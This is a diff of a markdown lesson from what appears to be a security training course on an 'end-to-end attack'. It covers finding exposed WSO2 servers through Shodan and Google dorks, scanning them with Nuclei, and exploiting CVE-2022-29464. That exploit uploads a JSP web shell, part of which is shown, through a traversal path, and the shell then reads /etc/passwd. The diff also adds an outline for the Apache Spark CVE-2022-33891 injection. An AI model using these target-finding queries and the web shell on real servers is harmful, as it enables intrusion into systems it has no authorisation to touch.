@@ -1,4 +1,11 @@
-# Session 10
+---
+linkTitle: 10. End-to-End Attack
+type: docs
+weight: 10
+---
+# Introduction
+
+TODO
 
 ## How to find targets in the wild
 ### Find targets using shodan.io
@@ -9,6 +16,8 @@ As presented to you in another session, **[shodan.io](https://www.shodan.io/dash
 But we can also use more specific queries to find targets that interest us. You can also specify the port numbers inside the shodan query, using the ```port:``` filter. Knowing that [WSO2](https://wso2.com) the default HTTP and HTTPS ports of a WSO2 product are 9763 and 9443 respectively, we can try to use the ```WSO2 port:9443,9763``` query, you can find some [WSO2](https://wso2.com) targets across the internet.
 
 <img src="./assets/shodan_finding_2-2.png" width=800 height=400>
+
+TODO Find targets using favicon hash with shodan
 
 ### Find targets using Google Dorks
 
@@ -26,7 +35,7 @@ intitle:"WSO2 Management Console"
 
 ## Use automation to find vulnerable targets with Nuclei
 
-[Nuclei](https://github.com/projectdiscovery/nuclei) is an important open-source tool used to find vulnerable targets, based on flexible templates written in yaml, which offers to scan for multiple protocols (HTTP, TCP, DNS, ...). The templates can be found inside the [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates/tree/master/cves) github page, sorted by the CVE release year. 
+[Nuclei](https://github.com/projectdiscovery/nuclei) is an important open-source tool used to find vulnerable targets, based on flexible templates written in yaml, which offers to scan for multiple protocols (HTTP, TCP, DNS, ...). The templates can be found inside the [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates/tree/master/cves) github page, sorted by the CVE release year.
 
 ### Download shodan findings
 
@@ -64,7 +73,9 @@ We can see that our target was found vulnerable by nuclei.
 
 <img src="./assets/nuclei_run.png">
 
-## Further CVE-2022-29464 exploitation
+## CVEs exploitation
+
+### CVE-2022-29464
 
 We didn't talk at all about how this vulnerability works; the main idea is that the vulnerable WSO2 products allow unrestricted file upload which results in remote code execution. This means that we can upload any file on the server. The main approach to succeed the vulnerability inside the WSO2 is to do a POST request which tries to upload a [web shell file](https://www.upguard.com/blog/what-are-web-shell-attacks) in JSP format on the target system.
 
@@ -88,7 +99,7 @@ requests:
         Host: {{Hostname}}
 ```
 
-We know that one of the vulnerable endpoint is the ```../../../../repository/deployment/server/webapps/authenticationendpoint/``` endpoint. So, the main idea is to send a **POST** request containing a web shell, which let us to send commands on the system: to craft a request like the one inside the ```.yaml``` file we will use Burp Suite. 
+We know that one of the vulnerable endpoint is the ```../../../../repository/deployment/server/webapps/authenticationendpoint/``` endpoint. So, the main idea is to send a **POST** request containing a web shell, which let us to send commands on the system: to craft a request like the one inside the ```.yaml``` file we will use Burp Suite.
 
 First, turn on the Intercept and catch a request to the ```/carbon``` endpoint, using the Chromium browser. Access the ```https://<IP>:9443/carbon``` from the Chromium Browser.
 
@@ -121,8 +132,8 @@ if (request.getParameter("cmd") != null) {
         DataInputStream dis = new DataInputStream(in);
         String disr = dis.readLine();
         while ( disr != null ) {
-                out.println(disr); 
-                disr = dis.readLine(); 
+                out.println(disr);
+                disr = dis.readLine();
                 }
         }
 %>
@@ -138,6 +149,12 @@ Right now we have an uploaded file situated on the ```https://<IP>:9443/authenti
 
 <img src="./assets/passwd_file.png" width=600 height=300>
 
+### CVE-2022-33891
+
+Apache Spark is an open-source, distributed processing system used for big data workloads and it utilizes in-memory caching, and optimized query execution for fast analytic queries. Apache Spark also provides a suite of web user interfaces (UI) that you can use to monitor the status and resource consumption of your Spark cluster.
+
+Last weeks, there was a new vulnerability found inside the Apache Spark Web UI component, containing a shell command injection vulnerability.
+
 # Further reading
 
 1. [Shodan API](https://developer.shodan.io/api/clients)
@@ -146,4 +163,6 @@ Right now we have an uploaded file situated on the ```https://<IP>:9443/authenti
 
 3. [How WSO2 CVE-2022-29464 works](https://github.com/tufanturhan/wso2-rce-cve-2022-29464)
 
-# Activities 
+4. [Apache Spark CVE-2022-33891](https://securityonline.info/cve-2022-33891-apache-spark-shell-command-injection-vulnerability/)
+
+# Activities
